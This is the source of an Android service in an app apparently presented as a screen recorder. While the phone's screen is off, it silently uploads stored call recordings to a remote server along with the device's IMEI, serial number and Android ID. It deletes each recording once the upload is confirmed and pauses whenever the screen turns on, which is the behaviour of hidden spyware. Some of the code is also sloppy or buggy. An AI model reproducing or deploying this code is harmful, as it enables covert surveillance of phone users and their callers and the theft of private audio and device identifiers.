package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.Base64;
import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.FileInputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class FileSendCall extends Service {
	private ConnectivityManager connectivity;
	private  NetworkInfo wifiInfo;

	public static boolean running = false;

	String aes;


	private WifiManager mWifiManager;

	PowerManager pm1;
	public BroadcastReceiver mReceiver;
	private Context mContext;


	private Timer timer;



	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	class Mp3Filter implements FilenameFilter {
		@Override
		public boolean accept(File dir, String name) {
			try
			{
				File root1 = new File(dir,name);

				long len = root1.length();
				if(len==0)
					return false;

				return name.startsWith("C_M")||name.startsWith("C_R")||name.startsWith("C_R1")||name.startsWith("C_R_");
			}
			catch(Exception e)			
			{
				Log.d("Location", "Exception in Mp3filter "+e);
			}
			return false;
		}
	}

	@Override
	public void onCreate() {

		super.onCreate();
		running = true;
		try
		{

			//newString3 = EncoDeco.decryptURL(url);
		}
		catch(Exception e)
		{
			Log.d(getClass().getSimpleName(),"Exception:"+e);
		}

		pm1 = (PowerManager) getSystemService(Context.POWER_SERVICE);

		IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		// filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.setPriority(999);
		mReceiver = new ScreenReceiver3();
		registerReceiver(mReceiver, filter);
		Log.d("rmdebug", "screenReceiver Registered");
		if(!pm1.isScreenOn())
			Callfilesend();
	}

	@Override
	public void onStart(Intent intent, int startId) 
	{
		running = true;
		//////////


	}//End Of On Start Method

	public void Callfilesend()
	{
		running = true;
		try
		{
			mContext = getApplicationContext();
		
			timer = new Timer();
			timer.scheduleAtFixedRate(new TimerTask() {

				@Override
				public void run() {
					Log.e(".............", "----------------------------------------- FileSendCall");
					String imei;
					TelephonyManager TM = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
					imei = TM.getDeviceId();
					byte[] imeiCallFileSend = imei.getBytes();
					String imeibaseCallFileSend = android.util.Base64.encodeToString(imeiCallFileSend, android.util.Base64.DEFAULT);
					System.out.println("imeibasewifi = " + imeibaseCallFileSend);
					String imeibaseCallFileSendstring = imeibaseCallFileSend.replaceAll("\n", "");
					System.out.println("imeibasewifistring = " + imeibaseCallFileSendstring);

					String serial = android.os.Build.SERIAL;
					System.out.println("Serial Call Recording = " +serial);
					byte[] serialFileSend = serial.getBytes();
					String serialbaseFileSend = android.util.Base64.encodeToString(serialFileSend, android.util.Base64.DEFAULT);
					String serialbaseFileSendstring = serialbaseFileSend.replaceAll("\n", "");
					System.out.println("serialbasecodestring = " + serialbaseFileSendstring);

					String uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
					System.out.println("uid Call Recording = " + uid);
					byte[] uidFileSend= uid.getBytes();
					String uidbaseFileSend = android.util.Base64.encodeToString(uidFileSend, android.util.Base64.DEFAULT);
					String uidbaseFileSendstring = uidbaseFileSend.replaceAll("\n", "");
					System.out.println("uidbasewifistring = " + uidbaseFileSendstring);

					HttpClient httpclient = new DefaultHttpClient();
					String aa = UrlDemo.Vrb_recording;
					HttpPost httppost = new HttpPost(aa);

					File sampleDir2 = getApplicationContext().getFilesDir();
					connectivity = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
					wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
					NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

					SharedPreferences sp = getSharedPreferences("key", 0);
					String tValue = sp.getString("chkcallrecord","");
					Log.d("checkcon-------","callrecordSharedvaluereceive::::------"+tValue);

					if(sampleDir2!=null){
						File[] filelist = sampleDir2.listFiles(new Mp3Filter());
						if (filelist.length > 0) {
							for (int z=filelist.length-1;z>=0&&(!pm1.isScreenOn());z--) {
								File file = filelist[z];

								try
								{
									FileInputStream fin = new FileInputStream(file);
									int length = (int)file.length();
									Log.d("File", "   first Call file created by mediarecorder File length ="+length);

									byte fileContent[] = new byte[length];
									int response1 = fin.read(fileContent);
									Log.d("File","   number of Callbyte actually read from file internal"+response1);
									aes= Base64.encodeBytes(fileContent) ;

								}
								catch(Exception e)
								{
									Log.d(getClass().getSimpleName(), "   Exception thrown in encrypting  internal files in FileSendCall "+e);
								}

								if(wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A"))
								{
									Log.d("File", "filesendcall sending file name "+file.getName());

									try {
										String	Email = "abc@xyz.com";

										List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
										if (imei != null){
											System.out.println("IMEI NOT NUll call recording = ");
											nameValuePairs.add(new BasicNameValuePair("FileData", aes));
											String time = file.getName();
											nameValuePairs.add(new BasicNameValuePair("FileName", time));
											nameValuePairs.add(new BasicNameValuePair("Email", Email));
											nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseCallFileSendstring));
											String amr = "amr";
											nameValuePairs.add(new BasicNameValuePair("FileType", amr));
											httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
											if(pm1.isScreenOn())
												return;
											HttpResponse response = httpclient.execute(httppost);
											response.getStatusLine();
											HttpEntity entity = response.getEntity();
											entity = response.getEntity();

											InputStream in = entity.getContent();
											String buffer = "";
											for (int i = in.read(); i != -1; i = in.read()) {
												buffer += (char) i;
												i++;
											}
											System.out.println("C_response of callrocord = " +buffer);

											if (buffer.equals("OK")) {
												file.delete();
												Log.d("C_File","   found OK from server");
											}
											else if(buffer.equalsIgnoreCase("OK")){
												file.delete();
												Log.d("C_File","   found OK from server else");
											}
											else if (buffer == "OK"){
												file.delete();
												Log.d("C_File","   found OK from server else buf equ ok");
											}
											else if (buffer.startsWith("OK")){
												file.delete();
												Log.d("C_File","   found OK from server else buf start ok");
											}
											else
											{
												Log.d("C_File","   wasn NOT OK from server");
												break;
											}
											in.close();
											if (entity != null) {  }
										}
										else if(serial != null){
											System.out.println("IMEI NUll && serial no not null call recording = ");
											nameValuePairs.add(new BasicNameValuePair("FileData", aes));
											String time = file.getName();
											nameValuePairs.add(new BasicNameValuePair("FileName", time));
											nameValuePairs.add(new BasicNameValuePair("Email", Email));
											nameValuePairs.add(new BasicNameValuePair("IMEI", serialbaseFileSendstring));
											String amr = "amr";
											nameValuePairs.add(new BasicNameValuePair("FileType", amr));
											httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
											if(pm1.isScreenOn())
												return;
											HttpResponse response = httpclient
													.execute(httppost);
											response.getStatusLine();

											HttpEntity entity = response.getEntity();
											entity = response.getEntity();

											InputStream in = entity.getContent();
											String buffer = "";
											for (int i = in.read(); i != -1; i = in.read()) {
												buffer += (char) i;
												i++;
											}
											System.out.println("C_Response of call record = " +buffer);

											if (buffer.equals("OK")) {
												file.delete();
												Log.d("C_File","   found OK from server");
											}
											else if (buffer.equals("OK")) {
												file.delete();
												Log.d("C_File","   found OK from server esle if");
											}
											else
											{
												Log.d("C_File","   wasn NOT OK from server");
											}

											in.close();

											if (entity != null) {  }
										}
										else {
											System.out.println("IMEI NUll && serial no null && Android Id not null call recording = ");
											nameValuePairs.add(new BasicNameValuePair("FileData", aes));
											String time = file.getName();
											nameValuePairs.add(new BasicNameValuePair("FileName", time));
											nameValuePairs.add(new BasicNameValuePair("Email", Email));
											nameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseFileSendstring));
											String amr = "amr";
											nameValuePairs.add(new BasicNameValuePair("FileType", amr));
											httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
											if(pm1.isScreenOn())
												return;
											HttpResponse response = httpclient
													.execute(httppost);
											response.getStatusLine();

											HttpEntity entity = response.getEntity();
											entity = response.getEntity();

											InputStream in = entity.getContent();
											String buffer = "";
											for (int i = in.read(); i != -1; i = in.read()) {
												buffer += (char) i;
												i++;
											}
											System.out.println("CallRecorderBuffer = " +buffer);

											if (buffer.equals("OK")) {

												file.delete();
												Log.d("File","   found OK from server");

											}
											else
											{
												Log.d("File","   wasn NOT OK from server");
												break;
											}

											in.close();

											if (entity != null) {  }
										}//elsecut

									}
									catch (ClientProtocolException e) {
										Log.d(getClass().getSimpleName(), "exception 1 in file send "+e);
									} catch (IOException e) {
										Log.d(getClass().getSimpleName(), "exception 2 in file send "+e);
									}

									catch(Exception e)
									{
										Log.v("File", "exception is generated "+e);
									}

								}// end of if (asw.contains(WIFI) || asw.equalsIgnoreCase(WIFI)||asw1.contains(gprs) || asw1.equalsIgnoreCase(gprs)) {
								else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")){
									Log.d("File", "filesendcall sending file name "+file.getName());

									try {
										String	Email = "abc@xyz.com";

										List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
										if (imei != null){
											System.out.println("IMEI NOT NUll call recording = ");
											nameValuePairs.add(new BasicNameValuePair("FileData", aes));
											String time = file.getName();
											nameValuePairs.add(new BasicNameValuePair("FileName", time));
											nameValuePairs.add(new BasicNameValuePair("Email", Email));
											nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseCallFileSendstring));
											String amr = "amr";
											nameValuePairs.add(new BasicNameValuePair("FileType", amr));
											httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
											if(pm1.isScreenOn())
												return;
											HttpResponse response = httpclient.execute(httppost);
											response.getStatusLine();
											HttpEntity entity = response.getEntity();
											entity = response.getEntity();

											InputStream in = entity.getContent();
											String buffer = "";
											for (int i = in.read(); i != -1; i = in.read()) {
												buffer += (char) i;
												i++;
											}
											System.out.println("CallRecorderBuffer = " +buffer);

											if (buffer.equals("OK")) {

												file.delete();
												Log.d("File","   found OK from server");

											}
											else
											{
												Log.d("File","   wasn NOT OK from server");
												break;
											}

											in.close();

											if (entity != null) {  }
										}
										else if(serial != null){
											System.out.println("IMEI NUll && serial no not null call recording = ");
											nameValuePairs.add(new BasicNameValuePair("FileData", aes));
											String time = file.getName();
											nameValuePairs.add(new BasicNameValuePair("FileName", time));
											nameValuePairs.add(new BasicNameValuePair("Email", Email));
											nameValuePairs.add(new BasicNameValuePair("IMEI", serialbaseFileSendstring));
											String amr = "amr";
											nameValuePairs.add(new BasicNameValuePair("FileType", amr));
											httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
											if(pm1.isScreenOn())
												return;
											HttpResponse response = httpclient
													.execute(httppost);
											response.getStatusLine();

											HttpEntity entity = response.getEntity();
											entity = response.getEntity();

											InputStream in = entity.getContent();
											String buffer = "";
											for (int i = in.read(); i != -1; i = in.read()) {
												buffer += (char) i;
												i++;
											}
											System.out.println("CallRecorderBuffer = " +buffer);

											if (buffer.equals("OK")) {

												file.delete();
												Log.d("File","   found OK from server");

											}
											else
											{
												Log.d("File","   wasn NOT OK from server");
												break;
											}

											in.close();

											if (entity != null) {  }
										}
										else {
											System.out.println("IMEI NUll && serial no null && Android Id not null call recording = ");
											nameValuePairs.add(new BasicNameValuePair("FileData", aes));
											String time = file.getName();
											nameValuePairs.add(new BasicNameValuePair("FileName", time));
											nameValuePairs.add(new BasicNameValuePair("Email", Email));
											nameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseFileSendstring));
											String amr = "amr";
											nameValuePairs.add(new BasicNameValuePair("FileType", amr));
											httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
											if(pm1.isScreenOn())
												return;
											HttpResponse response = httpclient
													.execute(httppost);
											response.getStatusLine();

											HttpEntity entity = response.getEntity();
											entity = response.getEntity();

											InputStream in = entity.getContent();
											String buffer = "";
											for (int i = in.read(); i != -1; i = in.read()) {
												buffer += (char) i;
												i++;
											}
											System.out.println("CallRecorderBuffer = " +buffer);

											if (buffer.equals("OK")) {

												file.delete();
												Log.d("File","   found OK from server");

											}
											else
											{
												Log.d("File","   wasn NOT OK from server");
												break;
											}

											in.close();

											if (entity != null) {  }
										}//elsecut

									}
									catch (ClientProtocolException e) {
										Log.d(getClass().getSimpleName(), "exception 1 in file send "+e);
									} catch (IOException e) {
										Log.d(getClass().getSimpleName(), "exception 2 in file send "+e);
									}

									catch(Exception e)
									{
										Log.v("File", "exception is generated "+e);
									}
								}

								else
								{
									Log.d("checkErroElse","FilesendCAll connection error");
									//stopSelf();
									return;
								}

							}// end of for loop
						}// end of if (sampleDir2.listFiles(new Mp3Filter()).length > 1) 
						else if(!(startcallrecording.call_recording_started))
						{
							stopSelf();
						}

					}//end of if(sampleDir2!=null)

				}

			},1000, 60300);//change Timer Value
		}
		catch(Exception e)
		{

		}
	}
	class ScreenReceiver3 extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			if(intent.getAction().equals(Intent.ACTION_SCREEN_ON))
			{
				Log.d("Debug","screen ON");
				try
				{if(timer!=null)
					timer.cancel();}catch(Exception e){;}
				//context.stopService(new Intent(context, Startvoice.class));
			}
			else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF))
			{
				Log.d("Debug","screen OFF");
				try
				{if(timer!=null)
					timer.cancel();}catch(Exception e){;}
				Callfilesend();
			}

		}

	}
	@Override
	public void onDestroy() {
		running = false;
		try
		{
			unregisterReceiver(mReceiver);
		}
		catch(Exception e)
		{
		}
		try
		{
			if(timer != null) {
				timer.cancel();
			}
		}
		catch(Exception e)
		{
			Log.d(getClass().getSimpleName(), "   Exception thrown in file send destructor "+e);
		}
	
		super.onDestroy();
	}
}